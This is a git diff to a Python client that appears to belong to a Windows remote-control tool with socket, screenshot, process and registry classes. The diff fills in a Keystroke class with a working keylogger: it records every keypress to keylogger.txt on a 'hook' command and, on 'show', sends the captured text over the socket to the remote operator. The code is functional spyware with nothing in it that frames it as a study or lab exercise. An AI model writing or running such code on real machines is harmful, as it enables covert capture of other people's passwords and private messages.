@@ -1,16 +1,18 @@
 import logging
 import os
-from re import sub
 import sys
 import socket
 import winreg
 import subprocess
 from PIL import Image, ImageGrab
 import io
+from pynput import keyboard
+import threading
 
 
 class ProcessRunning:
     pass
+
 
 class AppRunning:
     pass
@@ -73,7 +75,73 @@ class Screenshot:
 
 
 class Keystroke:
-    pass
+    def __init__(self, sock, opcode):
+        self.sock = sock
+        self.opcode = opcode
+
+    def on_press(self, key):
+
+        with open('keylogger.txt', 'a') as f:
+            try:
+                f.write('{0}'.format(key.char))
+            except AttributeError:
+                if key == keyboard.Key.home:
+                    pass
+                elif key == keyboard.Key.shift:
+                    f.write('')
+                elif key == keyboard.Key.ctrl:
+                    f.write('')
+                elif key == keyboard.Key.alt:
+                    f.write('')
+                elif key == keyboard.Key.alt_gr:
+                    f.write('')
+                elif key == keyboard.Key.esc:
+                    f.write('')
+                elif key == keyboard.Key.tab:
+                    f.write('\t')
+                elif key == keyboard.Key.enter:
+                    f.write('\n')
+                elif key == keyboard.Key.backspace:
+                    f.write('BACKSPACE')
+                elif key == keyboard.Key.delete:
+                    f.write('DELETE')
+                else:
+                    f.write('{0}'.format(key))
+
+    def on_release(self, key):
+        if key == keyboard.Key.home:
+            return False
+
+    def do_task(self):
+        listener = listener = keyboard.Listener(
+            on_press=self.on_press,
+            on_release=self.on_release)
+
+        if self.opcode == 'hook':
+            if os.path.exists('keylogger.txt'):
+                os.remove('keylogger.txt')
+            listener.start()
+
+        elif self.opcode == 'unhook':
+            with open('keylogger.txt', 'w') as f:
+                f.write('')
+            stop = keyboard.Controller()
+            stop.press(keyboard.Key.home)
+            stop.release(keyboard.Key.home)
+
+        elif self.opcode == 'show':
+            if os.path.exists('keylogger.txt'):
+                with open('keylogger.txt', 'r') as f:
+                    data = f.read()
+                    if data != '':
+                        self.sock.sendall(data.encode('utf8'))
+                        print(data)
+                    else:
+                        exit_code = '05forced_exit'
+                        self.sock.sendall(exit_code.encode('utf8'))
+            else:
+                exit_code = '05forced_exit'
+                self.sock.sendall(exit_code.encode('utf8'))
 
 
 class RegistryEdit:
